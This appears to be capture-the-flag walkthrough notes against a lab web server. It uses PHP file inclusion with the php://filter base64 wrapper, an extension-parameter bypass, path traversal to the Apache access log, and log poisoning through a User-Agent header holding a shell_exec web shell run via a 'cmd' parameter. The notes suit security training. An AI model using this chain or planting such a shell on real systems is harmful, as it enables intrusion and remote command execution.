We get another error message specifying that there is no ‘/etc/passwd.php’ file. We did not append .php to our request so it looks like the web server is doing that.



when we include a .php file we wont be able to see the actual PHP code since it runs on the server. A way around this is to use a handy PHP wrapper to base64 encode the file which we can decode later on. 
add base64 filter converter to view output as php is only viewed server side

> php://filter/convert.base64-encode/resource=

Lets look at the index file to see how we can bypass the .php extension from being added
> http://10.201.86.214/?view=php://filter/convert.base64-encode/resource=dog/../index



The following line is particularly interesting; similar to the ‘view’ parameter there is an ‘ext’ parameter that specifies the file extention and if it is not set then it will be .php by default. This explains why .php is appended to all file requests.

$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
To bypass this we just set the ‘ext’ parameter

add &ext= to bypass .php filter being added



website is being hosted on an Apache web server which by default has an access log.
We can ciew this log at 
/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=

Notice how the User-Agent is being logged as well
we can intercept our request using Burp and replace the User-Agent variable in the header with PHP code. The following is the PHP code we will inject. 


Modify user agent to upload cmd command ability


modify:
GET /?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1

User-Agent:<?php echo shell_exec($_GET['cmd']) ?>


With this shell in the log file 
we can specify the ‘cmd’ parameter with a command we wish to execute. 
for example:
http://10.201.86.214/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
